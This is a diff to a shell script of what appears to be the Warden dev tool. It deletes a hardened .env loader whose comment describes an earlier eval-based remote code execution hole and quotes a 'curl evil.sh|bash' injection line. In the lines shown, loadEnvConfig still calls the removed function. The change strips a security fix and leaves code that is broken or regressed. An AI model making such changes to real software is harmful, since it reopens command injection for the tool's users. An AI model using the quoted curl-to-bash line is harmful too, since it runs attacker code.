@@ -31,40 +31,6 @@ function locateEnvPath () {
     echo "${WARDEN_ENV_PATH}"
 }
 
-## Safely load whitelisted KEY=VALUE pairs from a dotenv-style file.
-## Replaces previous `eval "$(grep ...)"` pattern that allowed arbitrary
-## command execution if a project's .env contained shell metacharacters
-## (e.g. `WARDEN_FOO=$(curl evil.sh|bash)`), which is RCE on `warden env *`.
-function loadEnvFile () {
-    local envFile="${1}"
-    local prefixRegex="${2}"
-    [[ ! -f "${envFile}" ]] && return 0
-
-    local line key value
-    while IFS= read -r line || [[ -n "${line}" ]]; do
-        line="${line%$'\r'}"
-        [[ -z "${line}" ]] && continue
-        [[ "${line}" =~ ^[[:space:]]*# ]] && continue
-        [[ "${line}" != *=* ]] && continue
-
-        key="${line%%=*}"
-        value="${line#*=}"
-
-        # Reject anything that is not a POSIX shell identifier (must start with
-        # letter or underscore), and require it to match the requested prefix.
-        [[ ! "${key}" =~ ^[A-Za-z_][A-Za-z0-9_]*$ ]] && continue
-        [[ ! "${key}" =~ ^${prefixRegex} ]] && continue
-
-        # Strip surrounding single or double quotes — but never expand contents.
-        if [[ "${value}" =~ ^\"(.*)\"$ ]] || [[ "${value}" =~ ^\'(.*)\'$ ]]; then
-            value="${BASH_REMATCH[1]}"
-        fi
-
-        printf -v "${key}" '%s' "${value}"
-        export "${key?}"
-    done < "${envFile}"
-}
-
 function loadEnvConfig () {
     local WARDEN_ENV_PATH="${1}"
     loadEnvFile "${WARDEN_ENV_PATH}/.env" "WARDEN_"
